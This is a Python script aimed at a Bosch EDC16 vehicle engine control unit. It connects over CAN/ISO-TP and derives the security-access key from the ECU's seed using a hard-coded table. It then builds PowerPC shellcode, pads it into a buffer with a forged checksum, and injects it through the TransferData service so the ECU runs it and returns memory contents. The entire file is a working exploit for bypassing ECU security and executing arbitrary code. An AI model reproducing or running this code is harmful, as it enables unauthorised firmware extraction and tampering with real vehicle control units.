import can
import isotp
import time
import sys

# --- CONFIGURATION ---
CAN_INTERFACE = 'slcan'
CAN_CHANNEL = 'COM4' # UPDATE THIS to your CANable's COM port
BITRATE = 500000
ECU_TX_ID = 0x7E0
ECU_RX_ID = 0x7E8

# The target address to probe (Change this to test different regions)
# e.g., 0x00000000 (Internal Flash), 0x00100000 (EEPROM), 0x00800000 (External Flash)
TARGET_ADDR = 0x00000000 

TABLE = [0x0001C200, 0x0A221289, 0x144890A1, 0x24212491, 0x290A0285, 0x42145091, 0x504822C1, 0x0A24C4C1, 0x14252229, 0x24250525, 0x2510A491, 0x28488863, 0x29148885, 0x422184A5, 0x49128521, 0x50844A85, 0x620CC211, 0x124452A9, 0x18932251, 0x2424A459, 0x29149521, 0x42352621, 0x4A512289, 0x52A48911, 0x11891475, 0x22346523, 0x4A3118D1, 0x64497111, 0x0AE34529, 0x15398989, 0x22324A67, 0x2D12B489, 0x132A4A75, 0x19B13469, 0x25D2C453, 0x4949349B, 0x524E9259, 0x1964CA6B, 0x24F5249B, 0x28979175, 0x352A5959, 0x3A391749, 0x51D44EA9, 0x564A4F25, 0x6AD52649, 0x76493925, 0x25DE52C9, 0x332E9333, 0x68D64997, 0x494947FB, 0x33749ACF, 0x5AD55B5D, 0x7F272A4F, 0x35BD5B75, 0x3F5AD55D, 0x5B5B6DAD, 0x6B5DAD6B, 0x75B57AD5, 0x5DBAD56F, 0x6DBF6AAD, 0x75775EB5, 0x5AEDFED5, 0x6B5F7DD5, 0x6F757B6B]

MAGIC = bytes.fromhex("0521350135")
ID_STRING = b"Bosch.p_213.SwitchOver.EDC16.A000"

def compute_key(seed_int, subfn, attempt_num=1):
    iter_count = (attempt_num * 0x23)
    index = (subfn + 1) >> 1
    state = seed_int
    for _ in range(iter_count):
        msb = state & 0x80000000
        state = (state << 1) & 0xFFFFFFFF
        if msb:
            state ^= TABLE[index]
    return state

def calculate_checksum(data, seed=0xFAFCE69C):
    total = seed
    for i in range(0, len(data), 4):
        chunk = data[i:i+4].ljust(4, b'\xFF')
        w = int.from_bytes(chunk, 'big')
        swapped = ((w & 0xFF) << 24) | ((w & 0xFF00) << 8) | ((w >> 8) & 0xFF00) | (w >> 24)
        total = (total + swapped) & 0xFFFFFFFF
    return total

def build_payload(target_addr):
    # PowerPC Shellcode: Reads 4 bytes from target_addr, stores at 0x7F9200, calls transmit (0x243C)
    # Then returns to bootloader.
    sc = bytearray()
    sc += bytes.fromhex("3C6000006063F110") # lis r3, 0; ori r3, r3, 0xF110 (CAN ID)
    sc += bytes.fromhex("3C807F9260840000") # lis r4, 0x7F92; ori r4, r4, 0 (Buffer)
    sc += bytes.fromhex("3CA0000060A500FD") # lis r5, 0; ori r5, r5, 0xFD (Marker)
    sc += b"\x3C\xC0" + (target_addr >> 16).to_bytes(2, 'big') # lis r6, addr_hi
    sc += b"\x60\xC6" + (target_addr & 0xFFFF).to_bytes(2, 'big') # ori r6, r6, addr_lo
    sc += bytes.fromhex("80E60000") # lwz r7, 0(r6)
    sc += bytes.fromhex("90E40000") # stw r7, 0(r4)
    sc += bytes.fromhex("3D0000006108243C") # lis r8, 0; ori r8, r8, 0x243C
    sc += bytes.fromhex("7D0803A6") # mtctr r8
    sc += bytes.fromhex("4E800421") # bctrl
    sc += bytes.fromhex("4E800020") # blr

    size = 0x3FFC
    buf = bytearray([0xFF] * size)

    # Header
    uVar6 = 0x80
    buf[0] = uVar6
    buf[1] = ((uVar6 >> 4) | ((uVar6 & 0xF) << 4)) & 0xFF
    buf[2] = ((uVar6 >> 2) | ((uVar6 & 3) << 6)) & 0xFF
    buf[3] = 0x36 # Checksum byte

    # Function Pointer (Points to shellcode at 0x7F9808)
    buf[4:8] = (0x7F9808).to_bytes(4, 'big')

    # Insert Shellcode
    buf[8:8+len(sc)] = sc

    # Fix Checksum to 0xF7EAB8EE
    target = 0xF7EAB8EE
    current = calculate_checksum(buf)
    delta = (target - current) & 0xFFFFFFFF
    swapped_delta = ((delta & 0xFF) << 24) | ((delta & 0xFF00) << 8) | ((delta >> 8) & 0xFF00) | (delta >> 24)
    buf[-4:] = swapped_delta.to_bytes(4, 'big')

    return bytes(buf)

def main():
    print(f"[*] Target Address: 0x{TARGET_ADDR:08X}")
    payload = build_payload(TARGET_ADDR)
    
    bus = can.interface.Bus(bustype=CAN_INTERFACE, channel=CAN_CHANNEL, bitrate=BITRATE)
    addr = isotp.Address(isotp.AddressingMode.Normal_11bits, txid=ECU_TX_ID, rxid=ECU_RX_ID)
    stack = isotp.CanStack(bus=bus, address=addr, params={'blocking_send': True})

    def send_uds(payload, desc="", silent=False):
        if not silent: print(f"[TX] {desc}: {payload.hex().upper()[:64]}...")
        stack.send(bytearray(payload))
        timeout = time.time() + 2.0
        while time.time() < timeout:
            stack.process()
            if stack.available():
                resp = stack.recv()
                if not silent: print(f"[RX] {resp.hex().upper()}")
                return resp
            time.sleep(0.01)
        return None

    # 1. Unlock LVL1
    send_uds([0x10, 0x03], "Session", silent=True)
    resp = send_uds([0x27, 0x01], "Seed", silent=True)
    if not resp or resp[0] != 0x67: return
    seed = int.from_bytes(resp[2:6], 'big')
    key = compute_key(seed, 0x01)
    resp = send_uds([0x27, 0x02] + list(key.to_bytes(4, 'big')), "Key", silent=True)
    if not resp or resp[0] != 0x67: return
    print("[+] LVL1 Unlocked")

    # 2. Send Payload via 0x36 (TransferData)
    # We use 0x36 because the validator checks for it.
    # The payload will be copied to 0x7F9800, validated, and executed.
    payload_msg = [0x36, 0x00, (len(payload) >> 8) & 0xFF, len(payload) & 0xFF] + list(payload)
    
    print("[*] Sending RAM Injector...")
    resp = send_uds(payload_msg, "Inject", silent=False)
    
    if resp:
        print(f"\n[***] SUCCESS! Received: {resp.hex().upper()} [***]")
        if len(resp) >= 4:
            val = int.from_bytes(resp[-4:], 'big')
            print(f"Data at 0x{TARGET_ADDR:08X}: 0x{val:08X}")
    else:
        print("[-] No response. Injection failed.")

if __name__ == "__main__":
    main()